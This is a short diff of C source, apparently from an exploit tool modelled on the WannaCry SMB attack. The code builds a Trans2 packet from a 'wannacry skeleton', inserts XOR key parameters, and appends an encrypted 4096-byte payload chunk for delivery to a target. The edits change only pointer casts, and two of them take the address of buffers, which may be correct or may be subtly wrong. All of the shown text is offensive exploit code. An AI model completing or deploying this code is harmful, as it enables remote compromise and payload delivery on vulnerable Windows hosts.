@@ -337,7 +337,7 @@ int main(int argc, char* argv[])
 	memset((unsigned char*)big_packet, 0x00, 4178 + 1);
 
 	//copy wannacry skeleton packet to big Trans2 packet
-	memcpy((unsigned char*)big_packet, (char*)&wannacry_Trans2_Request, 70);
+	memcpy((unsigned char*)big_packet, (unsigned char*)&wannacry_Trans2_Request, 70);
 
 	//copy XOR values to parameters buffer
 	memcpy((char*)Parametersbuffer, (char*)&TotalSizeOfPayload, 4);
@@ -345,10 +345,10 @@ int main(int argc, char* argv[])
 	memcpy((char*)Parametersbuffer + 8, (char*)&OffsetofChunkinPayload, 4);
 
 	//copy parameters to big packet at offset 70 ( after the trans2 exec packet )
-	memcpy((unsigned char*)big_packet + 70, (char*)Parametersbuffer, 12);
+	memcpy((unsigned char*)big_packet + 70, (unsigned char*)&Parametersbuffer, 12);
 
 	//copy encrypted payload
-	memcpy((unsigned char*)big_packet + 82, (unsigned char*)encrypted, 4096);
+	memcpy((unsigned char*)big_packet + 82, (unsigned char*)&encrypted, 4096);
 
 	//Update treeID, UserID
 	memcpy((unsigned char*)big_packet + 28, (char*)&treeid, 2);
